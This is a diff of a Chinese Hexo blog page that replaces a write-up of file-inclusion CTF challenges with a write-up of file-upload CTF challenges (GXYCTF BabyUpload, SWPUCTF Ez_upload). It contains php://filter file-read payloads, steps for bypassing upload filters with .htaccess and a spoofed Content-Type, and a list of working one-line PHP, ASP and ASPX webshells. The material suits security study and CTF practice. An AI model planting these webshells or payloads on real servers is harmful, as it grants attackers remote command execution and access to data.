@@ -19,32 +19,39 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="文件包含信息和文件类型： 文本文件： .txt 文件：通常包含文本信息，可能是直接的提示、密码、或者指向其他文件的链接。 .md 文件（Markdown 文件）：用于格式化文本信息，可能包含链接、代码片段等。   图片文件： .png, .jpg, .gif 等：图片文件可能包含隐藏的文本（如通过图片编辑软件查看隐藏信息），或者作为视觉谜题的线索。 .bmp 文件：有时用于存储二进制数据或作为某种">
+    <meta name="description" content="一：介绍1. 文件上传漏洞的概述文件上传漏洞通常出现在基于Web的应用程序中，允许用户上传文件。如果服务器端的代码没有正确验证或限制上传的文件类型、大小、内容等，攻击者就可以利用这一漏洞上传恶意文件。例如：  PHP木马：攻击者可以上传一个PHP脚本文件，该文件包含恶意代码，当服务器执行这个文件时，攻击者可以控制服务器。 Webshell：一种用于远程控制服务器的工具，通过上传Webshell，攻">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件包含">
-<meta property="og:url" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="文件包含信息和文件类型： 文本文件： .txt 文件：通常包含文本信息，可能是直接的提示、密码、或者指向其他文件的链接。 .md 文件（Markdown 文件）：用于格式化文本信息，可能包含链接、代码片段等。   图片文件： .png, .jpg, .gif 等：图片文件可能包含隐藏的文本（如通过图片编辑软件查看隐藏信息），或者作为视觉谜题的线索。 .bmp 文件：有时用于存储二进制数据或作为某种">
+<meta property="og:description" content="一：介绍1. 文件上传漏洞的概述文件上传漏洞通常出现在基于Web的应用程序中，允许用户上传文件。如果服务器端的代码没有正确验证或限制上传的文件类型、大小、内容等，攻击者就可以利用这一漏洞上传恶意文件。例如：  PHP木马：攻击者可以上传一个PHP脚本文件，该文件包含恶意代码，当服务器执行这个文件时，攻击者可以控制服务器。 Webshell：一种用于远程控制服务器的工具，通过上传Webshell，攻">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232123827.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232149377.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232218955.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232238575.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232257799.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232314601.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232334308.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232348290.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232358475.png">
-<meta property="og:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232404926.png">
-<meta property="article:published_time" content="2025-01-25T12:58:12.000Z">
-<meta property="article:modified_time" content="2025-01-25T15:27:27.052Z">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126214858346.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215007220.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215053575.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215648388.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215806119.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126220622866.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221322956.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221510409.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221826260.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222232057.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222357384.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223830692.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223940390.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224236462.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224515503.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224607658.png">
+<meta property="og:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126225053720.png">
+<meta property="article:published_time" content="2025-01-26T13:27:33.000Z">
+<meta property="article:modified_time" content="2025-01-26T14:51:08.221Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232123827.png">
+<meta name="twitter:image" content="http://example.com/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126214858346.png">
   
   
   
-  <title>文件包含 - Hexo</title>
+  <title>文件上传 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -223,7 +230,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="文件包含"></span>
+            <span id="subtitle" data-typed-text="文件上传"></span>
           
         </div>
 
@@ -234,8 +241,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-25 20:58" pubdate>
-          2025年1月25日 晚上
+        <time datetime="2025-01-26 21:27" pubdate>
+          2025年1月26日 晚上
         </time>
       </span>
     
@@ -246,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          965 字
+          803 字
         
       </span>
     
@@ -257,7 +264,7 @@
         
         
         
-          9 分钟
+          7 分钟
         
       </span>
     
@@ -303,80 +310,87 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">文件包含</h1>
+            <h1 id="seo-header">文件上传</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="文件包含信息和文件类型："><a href="#文件包含信息和文件类型：" class="headerlink" title="文件包含信息和文件类型："></a>文件包含信息和文件类型：</h3><ol>
-<li><strong>文本文件</strong>：<ul>
-<li><code>.txt</code> 文件：通常包含文本信息，可能是直接的提示、密码、或者指向其他文件的链接。</li>
-<li><code>.md</code> 文件（Markdown 文件）：用于格式化文本信息，可能包含链接、代码片段等。</li>
+                <h2 id="一：介绍"><a href="#一：介绍" class="headerlink" title="一：介绍"></a>一：介绍</h2><h3 id="1-文件上传漏洞的概述"><a href="#1-文件上传漏洞的概述" class="headerlink" title="1. 文件上传漏洞的概述"></a>1. 文件上传漏洞的概述</h3><p><strong>文件上传漏洞</strong>通常出现在基于Web的应用程序中，允许用户上传文件。如果服务器端的代码没有正确验证或限制上传的文件类型、大小、内容等，攻击者就可以利用这一漏洞上传恶意文件。例如：</p>
+<ul>
+<li><strong>PHP木马</strong>：攻击者可以上传一个PHP脚本文件，该文件包含恶意代码，当服务器执行这个文件时，攻击者可以控制服务器。</li>
+<li><strong>Webshell</strong>：一种用于远程控制服务器的工具，通过上传Webshell，攻击者可以执行任意命令。</li>
+</ul>
+<h3 id="2-常见的文件上传漏洞场景"><a href="#2-常见的文件上传漏洞场景" class="headerlink" title="2. 常见的文件上传漏洞场景"></a>2. 常见的文件上传漏洞场景</h3><ul>
+<li><strong>未限制文件类型</strong>：攻击者可以上传非预期的文件类型，如<code>.php</code>、<code>.asp</code>等。</li>
+<li><strong>未限制文件大小</strong>：攻击者可以上传大文件，消耗服务器资源。</li>
+<li><strong>不安全的文件名处理</strong>：如果服务器直接使用上传的文件名，而没有进行适当的处理或过滤，可能导致路径遍历攻击。</li>
+<li><strong>不验证文件内容</strong>：直接将上传的文件保存到服务器，未进行任何形式的检查或消毒处理。</li>
+</ul>
+<h2 id="二：题目"><a href="#二：题目" class="headerlink" title="二：题目"></a>二：题目</h2><h3 id="题目1-GXYCTF-2019-BabyUpload"><a href="#题目1-GXYCTF-2019-BabyUpload" class="headerlink" title="题目1 [GXYCTF 2019]BabyUpload"></a>题目1 [GXYCTF 2019]BabyUpload</h3><p>先打开靶机，显示的是一下界面</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126214858346.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126214858346">
+
+<p>先上传一个jpg试试</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215007220.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126215007220">
+
+<p>提示太露骨了</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215053575.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126215053575">
+
+<p>一句话木马改成.jpg类型上传</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215648388.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126215648388">
+
+<p>改成.php类型</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126215806119.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126215806119">
+
+<p>然后试试其他类型的一句话木马，用.jpg上传</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126220622866.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126220622866">
+
+<p>发现上传成功，接下来只需要能够解析.jpg文件中的php代码就OK了。</p>
+<p>解析.jpg文件中的php代码，我们可以使用.htaccess文件来进行实现。</p>
+<p>在上传.htaccess时要利用Burpsuite进行抓包，修改 Content-type为image&#x2F;jpeg然后放行</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221322956.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126221322956">
+
+<p>就会显示.htaccess上传成功，然后再上传那个其他类型的一句话木马</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221510409.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126221510409">
+
+<p>显示那个一句话木马也上传成功了，然后用蚁剑连接，先测试一下，发现连接成功</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126221826260.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126221826260">
+
+<p>在根目录下找到flag</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222232057.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126222232057">
+
+<p>点进去，就拿到flag了</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126222357384.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126222357384">
+
+<h3 id="题目2-SWPUCTF-2022-新生赛-Ez-upload"><a href="#题目2-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="题目2 [SWPUCTF 2022 新生赛]Ez_upload"></a>题目2 [SWPUCTF 2022 新生赛]Ez_upload</h3><p>修改过的一句话木马用.jpg上传，发现上传成功，但是蚁剑连接不上</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223830692.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126223830692">
+
+<p>可以试试.php行不行</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126223940390.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126223940390">
+
+<p>后缀名不能有ph！ ，与上一题一样还要传入一个.htaccess用Burpsuite进行抓包，修改 Content-type为image&#x2F;jpeg然后放行<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224236462.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126224236462"></p>
+<p>上传成功，再上传一次一句话木马，用蚁剑连接<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224515503.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126224515503"></p>
+<p>根目录下有flag，但是打开里面是空的</p>
+<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126224607658.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126224607658">
+
+<p>可以用post请求访问phpinfo()页面  post传参  cmd&#x3D;phpinfo();<img src="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250126225053720.png" srcset="/img/loading.gif" lazyload class="" title="image-20250126225053720"></p>
+<p>ctrl+f输入flag，快速定位flag</p>
+<h2 id="三：常见的一句话木马"><a href="#三：常见的一句话木马" class="headerlink" title="三：常见的一句话木马"></a>三：常见的一句话木马</h2><p><strong>常见的一句话木马</strong>‌包括以下几种形式：‌1</p>
+<ol>
+<li>‌**<a target="_blank" rel="noopener" href="http://www.baidu.com/s?tn=34046034_10_dg&wd=PHP&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=7844Gjgg4F1PE+0N/RdtYEDK6vwQZp+sHeI1nnAFqMzjfqgWSTMV7xugXr40/eVa7SVzhv4&rsv_dl=re_dqa_generate&sa=re_dqa_generate">PHP</a>木马**‌：<ul>
+<li><code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：这是最简单的一句话木马，通过POST请求执行代码。</li>
+<li><code>&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;</code>：通过GET请求执行代码。</li>
+<li><code>&lt;?php assert($_POST[&#39;cmd&#39;]); ?&gt;</code>：使用assert函数执行代码。</li>
 </ul>
 </li>
-<li><strong>图片文件</strong>：<ul>
-<li><code>.png</code>, <code>.jpg</code>, <code>.gif</code> 等：图片文件可能包含隐藏的文本（如通过图片编辑软件查看隐藏信息），或者作为视觉谜题的线索。</li>
-<li><code>.bmp</code> 文件：有时用于存储二进制数据或作为某种形式的加密或编码的输入。</li>
+<li>‌**<a target="_blank" rel="noopener" href="http://www.baidu.com/s?tn=34046034_10_dg&wd=ASP&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=d2e2w3EckCuTGE0HFq+pTEVFEnY3SbCXkf+nNBcPZGi8n+Z4msdXmfVW2LvJW38EpNsFnB0&rsv_dl=re_dqa_generate&sa=re_dqa_generate">ASP</a>木马**‌：<ul>
+<li><code>&lt;% execute(request(&quot;value&quot;)) %&gt;</code>：通过request对象执行代码。</li>
 </ul>
 </li>
-<li><strong>音频文件</strong>：<ul>
-<li><code>.wav</code>, <code>.mp3</code> 等：音频文件中可能包含隐藏的音频信息（如莫尔斯电码、语音消息等）。</li>
-</ul>
-</li>
-<li><strong>视频文件</strong>：<ul>
-<li><code>.mp4</code>, <code>.avi</code> 等：视频文件可能包含字幕、隐藏的图像或音频线索，或者视频本身就是一个谜题（如需要通过特定的播放器或设置来观看）。</li>
-</ul>
-</li>
-<li><strong>二进制文件</strong>：<ul>
-<li><code>.bin</code>, <code>.exe</code> 等：这些文件可能直接包含需要解密或分析的数据，或者作为某种形式的加密挑战。</li>
-</ul>
-</li>
-<li><strong>压缩文件</strong>：<ul>
-<li><code>.zip</code>, <code>.rar</code> 等：压缩文件中可能包含更多的文件或文档，解开这些压缩文件可能会揭示新的线索或挑战。</li>
-</ul>
-</li>
-<li><strong>网络文件</strong>：<ul>
-<li>网页、在线服务链接等：有时挑战会指向一个在线服务或网页，需要用户与之交互以获取信息或解决谜题。</li>
+<li>‌**<a target="_blank" rel="noopener" href="http://www.baidu.com/s?tn=34046034_10_dg&wd=ASPX&usm=5&ie=utf-8&rsv_pq=a1cb4fe400014b36&oq=%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&rsv_t=15f21KD/93aSaIlfYtCZ5sIDE4O7jt1I/gntaavGYyZhZSsMSClYvPltU3Cg4Wsp9uWHdZ8&rsv_dl=re_dqa_generate&sa=re_dqa_generate">ASPX</a>木马**‌：<ul>
+<li><code>&lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;pass&quot;], &quot;unsafe&quot;); %&gt;</code>：使用Jscript语言执行代码。</li>
 </ul>
 </li>
 </ol>
-<h3 id="解决方法示例："><a href="#解决方法示例：" class="headerlink" title="解决方法示例："></a>解决方法示例：</h3><ul>
-<li><strong>文本分析</strong>：仔细阅读文本内容，查找关键字、模式或隐藏的文本。</li>
-<li><strong>图片分析</strong>：使用图片编辑软件查看隐藏信息，或者使用专门的工具（如Stegsolve）来查看图片的LSB（最低有效位）隐藏信息。</li>
-<li><strong>音频分析</strong>：使用音频分析工具（如Audacity）来查看音频波形中的隐藏信息，或者使用频谱分析来识别隐藏的音频信号。</li>
-<li><strong>视频分析</strong>：使用视频编辑软件查看字幕或隐藏对象，或者尝试不同的播放器设置来揭示内容。</li>
-<li><strong>二进制分析</strong>：使用十六进制编辑器（如HxD）查看和分析二进制数据，尝试不同的编码和解码技术。</li>
-<li><strong>网络交互</strong>：根据提供的链接进行在线交互，可能需要解决验证码、登录验证或其他类型的挑战。</li>
-</ul>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目1-SWPUCTF-2021-新生赛-include"><a href="#题目1-SWPUCTF-2021-新生赛-include" class="headerlink" title="题目1[SWPUCTF 2021 新生赛]include"></a>题目1[SWPUCTF 2021 新生赛]include</h3><p>打开网址，出现以下界面</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232123827.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232123827">
-
-<p>根据提示hackbar 并输入？file&#x3D;1</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232149377.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232149377">
-
-<p>从上面可以看到flag字样，说flag在flag.php中，所以我们要想办法看到flag.php里面的内容，进行代码审计，审计得知，<code>allow_url_include</code> 设置为 <code>on</code>，且目标文件为“flag.php”我们可以利用PHP伪协议来攻击：php:&#x2F;&#x2F;filter:&#x2F;resource&#x3D;flag.php与包含文件结合时，php:&#x2F;&#x2F;filter流会被作为php文件执行，但我们只是为了提取目标文件，为了避免执行后看不到文件，对其进行编码，让其不被执行:php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232218955.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232218955">
-
-<p>得到base64编码的flag，进行解码</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232238575.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232238575">
-
-<p>得到flag</p>
-<h3 id="题目2-鹏城杯-2022-简单包含"><a href="#题目2-鹏城杯-2022-简单包含" class="headerlink" title="题目2[鹏城杯 2022]简单包含"></a>题目2[鹏城杯 2022]简单包含</h3><p>打开网页</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232257799.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232257799">
-
-<p>让在post里面传入flag，所以在post data里面输入flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232314601.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232314601">
-
-<p>发现报错了，那就查看一下源码index.php，看看有什么条件</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232334308.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232334308">
-
-<p>进行base64解码<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232348290.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232348290"></p>
-<p>审计可知使用POST传flag，preg_match过滤了flag，前面还有一个&lt;800规则<br> 也就是我输入的字符串要有800个字符才能读取到，那么我们可以使用&amp;符号构造一条语句</p>
-<p>所以输入a&#x3D;aaaa…（一共800个）&amp;flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232358475.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232358475">
-
-<p>再进行base64解码，得到flag</p>
-<img src="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250125232404926.png" srcset="/img/loading.gif" lazyload class="" title="image-20250125232404926">
 
                 
               </div>
@@ -394,8 +408,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>文件包含</div>
-      <div>http://example.com/2025/01/25/文件包含/</div>
+      <div>文件上传</div>
+      <div>http://example.com/2025/01/26/文件上传/</div>
     </div>
     <div class="license-meta">
       
@@ -407,7 +421,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月25日</div>
+          <div>2025年1月26日</div>
         </div>
       
       
@@ -439,18 +453,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件上传</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/24/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
-                        <span class="hidden-mobile">sql注入</span>
+                      <a href="/2025/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">
+                        <span class="hidden-mobile">文件包含</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
